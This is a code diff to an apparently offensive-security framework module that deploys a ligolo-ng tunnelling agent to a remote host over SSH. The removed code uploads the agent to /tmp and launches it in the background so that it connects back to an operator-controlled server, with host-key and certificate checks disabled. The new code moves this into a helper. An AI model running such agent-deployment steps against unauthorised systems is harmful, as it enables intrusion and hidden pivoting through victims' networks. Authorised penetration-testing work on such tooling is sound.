@@ -9,6 +9,7 @@ from purplesploit.core.module import BaseModule
 import subprocess
 from pathlib import Path
 from typing import Dict, Any, List
+from ._ssh import deploy_over_ssh
 
 
 class LigoloDeployModule(BaseModule):
@@ -205,13 +206,11 @@ class LigoloDeployModule(BaseModule):
             }
 
     def deploy_via_ssh(self) -> Dict[str, Any]:
-        """Deploy ligolo-ng agent via SSH."""
+        """Deploy ligolo-ng agent via verified, noninteractive OpenSSH."""
         self.log("Deploying Ligolo agent via SSH...")
 
         rhost = self.get_option("RHOST")
         username = self.get_option("USERNAME")
-        password = self.get_option("PASSWORD")
-        ssh_key = self.get_option("SSH_KEY")
         local_file = self.get_option("LOCAL_FILE")
         ligolo_server = self.get_option("LIGOLO_SERVER")
 
@@ -221,66 +220,14 @@ class LigoloDeployModule(BaseModule):
                 "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
             }
 
-        try:
-            remote_path = "/tmp/ligolo-agent"
-
-            # Upload via SCP
-            if ssh_key:
-                scp_cmd = [
-                    "scp", "-i", ssh_key,
-                    "-o", "StrictHostKeyChecking=no",
-                    local_file,
-                    f"{username}@{rhost}:{remote_path}"
-                ]
-            else:
-                scp_cmd = [
-                    "sshpass", "-p", password,
-                    "scp", "-o", "StrictHostKeyChecking=no",
-                    local_file,
-                    f"{username}@{rhost}:{remote_path}"
-                ]
-
-            self.log(f"Uploading agent to {rhost}...")
-            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
-
-            if result.returncode != 0:
-                return {
-                    "success": False,
-                    "error": f"Upload failed: {result.stderr}"
-                }
-
-            # Execute agent
-            if ssh_key:
-                ssh_cmd = [
-                    "ssh", "-i", ssh_key,
-                    "-o", "StrictHostKeyChecking=no",
-                    f"{username}@{rhost}",
-                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
-                ]
-            else:
-                ssh_cmd = [
-                    "sshpass", "-p", password,
-                    "ssh", "-o", "StrictHostKeyChecking=no",
-                    f"{username}@{rhost}",
-                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
-                ]
-
-            self.log("Executing agent...")
-            exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=60)
-
-            self.log("Ligolo agent deployed successfully", "success")
-            return {
-                "success": True,
-                "output": exec_result.stdout,
-                "method": "ssh",
-                "remote_path": remote_path
-            }
-
-        except Exception as e:
-            return {
-                "success": False,
-                "error": f"SSH deployment failed: {str(e)}"
-            }
+        result = deploy_over_ssh(
+            self, host=rhost, username=username, local_file=local_file,
+            remote_path="/tmp/ligolo-agent",
+            arguments=["-connect", str(ligolo_server)],
+            execute=True, background=True, timeout=60,
+        )
+        result.setdefault("method", "ssh")
+        return result
 
     def deploy_via_smb(self) -> Dict[str, Any]:
         """Deploy ligolo-ng agent via SMB."""
